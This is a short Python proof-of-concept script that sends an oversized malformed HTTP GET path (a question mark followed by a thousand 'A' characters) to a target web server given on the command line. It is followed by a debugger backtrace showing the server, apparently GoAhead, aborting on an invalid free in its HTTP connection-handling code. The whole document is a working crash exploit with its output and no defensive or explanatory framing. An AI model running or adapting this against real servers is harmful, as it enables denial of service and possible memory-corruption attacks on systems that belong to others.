import socket
import time
import sys

HOST = sys.argv[1]
PORT = int(sys.argv[2])

crash = '?'*1 + 'A' * 1000

payload = 'GET ' + crash + ' HTTP/1.1\r\n'
payload += 'Host: ' + HOST + ':' + str(PORT) + '\r\n\r\n'

print('[+] {}'.format(payload))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        s.connect((HOST, PORT))
        break
    except ConnectionRefusedError as e:
        print(e)
        time.sleep(0.2)
        continue

s.send(payload.encode())
data = s.recv(1024)
print(data.decode())
s.close()

#0  0xb7761c31 in __kernel_vsyscall ()
#1  0xb7588ea9 in __GI_raise (sig=6) at ../sysdeps/unix/sysv/linux/raise.c:54
#2  0xb758a407 in __GI_abort () at abort.c:89
#3  0xb75c437c in __libc_message (do_abort=2, fmt=0xb76bce54 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
#4  0xb75ca2f7 in malloc_printerr (action=<optimized out>, str=0xb76bcea4 "munmap_chunk(): invalid pointer", ptr=<optimized out>, ar_ptr=0x0) at malloc.c:5006
#5  0xb75ca9e9 in munmap_chunk (p=p@entry=0xb774c46f) at malloc.c:2842
#6  0xb75ce4f8 in __GI___libc_free (mem=0xb774c477) at malloc.c:2963
#7  0xb7739e17 in termWebs (wp=wp@entry=0x9f441d0, reuse=reuse@entry=1) at src/http.c:457
#8  0xb773a3f7 in reuseConn (wp=0x9f441d0) at src/http.c:520
#9  complete (wp=wp@entry=0x9f441d0, reuse=reuse@entry=1) at src/http.c:575
#10 0xb773b14f in websPump (wp=0x9f441d0) at src/http.c:837
#11 0xb773c115 in readEvent (wp=0x9f441d0) at src/http.c:797
#12 socketEvent (sid=1, mask=2, wptr=0x9f441d0) at src/http.c:735
#13 0xb7749792 in socketDoEvent (sp=0x9f44120) at src/socket.c:649
#14 socketProcess () at src/socket.c:623
#15 0xb77368e2 in websServiceEvents (finished=0x804b080 <finished>) at src/http.c:1290
#16 0x08048cb1 in main (argc=4, argv=0xbfe53584, envp=0xbfe53598) at src/goahead.c:146